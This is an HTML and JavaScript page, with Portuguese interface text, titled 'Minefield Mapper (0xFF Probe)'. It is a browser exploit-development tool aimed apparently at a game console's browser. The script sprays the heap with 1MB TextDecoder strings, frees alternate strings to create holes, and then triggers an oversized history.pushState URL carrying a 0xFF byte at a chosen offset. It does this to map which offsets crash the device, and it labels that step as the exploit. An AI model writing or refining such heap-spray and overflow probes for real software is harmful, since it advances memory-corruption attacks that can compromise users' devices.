<!DOCTYPE html>
<html>
<head>
    <title>Minefield Mapper (0xFF Probe)</title>
    <style>
        body { background-color: #000; color: #ff3300; font-family: monospace; padding: 20px; text-align: center; }
        input { font-size: 30px; background: #220000; color: #fff; border: 2px solid #f00; text-align: center; padding: 10px; width: 300px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #f00; background: #111; color: #fff; cursor: pointer; margin-top: 20px; }
        #log { border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px; text-align: left;}
        .safe { color: #0f0; font-weight: bold; }
        .danger { color: #f00; font-weight: bold; }
    </style>
</head>
<body>

    <h1>Minefield Mapper</h1>
    <p>Teste onde o 0xFF para de travar o console. Comece em 709523.</p>

    <div style="text-align:center">
        OFFSET DO TIRO (0xFF):<br>
        <input type="number" id="offsetInput" value="709523">
    </div>

    <div style="margin-top:10px;">
        <button onclick="adjust(1)" style="width:45%">+1 Byte</button>
        <button onclick="adjust(8)" style="width:45%">+8 Bytes</button>
    </div>

    <button onclick="fireProbe()">DISPARAR SONDA 0xFF</button>
    
    <div id="log">Pronto. Reinicie se travar.</div>

    <script>
        const OVERFLOW_AMT = 1024 * 64; 
        // Usamos o Spray de 1MB TextDecoder (O mais estável para alinhamento)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'safe' ? 'class="safe"' : (type === 'danger' ? 'class="danger"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function adjust(val) {
            let el = document.getElementById('offsetInput');
            el.value = parseInt(el.value) + val;
        }

        async function fireProbe() {
            let offset = parseInt(document.getElementById('offsetInput').value);
            log(`----------------------------------------`);
            log(`TESTANDO 0xFF EM: ${offset}`);
            
            // 1. Limpeza
            victims = [];
            await forceGC();

            try {
                // 2. Spray (Setup padrão)
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); 
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                for(let i=0; i<60; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. Buracos
                for(let i=0; i<60; i+=2) victims[i] = null;
                await forceGC();

                // 4. EXPLOIT (A SONDA)
                log("Injetando sonda...");
                setTimeout(() => {
                    try {
                        // Preenche até o ponto alvo
                        let buffer = "A".repeat(offset);
                        
                        // Coloca a Mina (0xFF)
                        // Se bater em algo vital, TRAVA.
                        // Se bater em dados, SOBREVIVE.
                        buffer += "\xFF"; 
                        
                        // Completa o resto com 'A' para manter o peso
                        buffer += "A".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "probe_" + offset, "/" + buffer);

                        // Se chegou aqui...
                        log(`SOBREVIVEU! O offset ${offset} aceita 0xFF. (FIM DO CAMPO MINADO)`, 'safe');

                    } catch (e) {
                        log("Erro JS: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 400));
        }
    </script>
</body>
</html>
